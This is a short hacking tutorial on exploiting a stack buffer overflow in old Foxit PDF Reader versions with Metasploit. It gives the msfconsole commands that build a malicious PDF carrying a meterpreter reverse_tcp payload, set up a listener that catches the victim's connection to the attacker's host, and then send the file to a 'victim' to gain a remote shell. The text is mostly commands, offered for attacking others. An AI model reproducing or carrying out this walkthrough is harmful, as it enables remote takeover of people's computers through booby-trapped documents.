How to Hack Remote PC using Foxit Reader

This module exploits a stack buffer overflow in Foxit PDF Reader prior to version 4.2.0.0928. The vulnerability is triggered when opening a malformed PDF file that contains an overly long string in the Title field. This results in overwriting a structured exception handler record. NOTE: This exploit does not use JavaScript.
Foxit Reader v4.1.1 X
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/foxit_title_bof
Msf exploit (foxit_title_bof)>set payload windows/meterpreter/reverse_tcp
Msf exploit (foxit_title_bof)> set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (foxit_title_bof)>exploit

After we successfully generate the malicious PDF, it will stored on your local computer
/root/.msf4/local/corelan_foxit.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your corelan_foxit.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
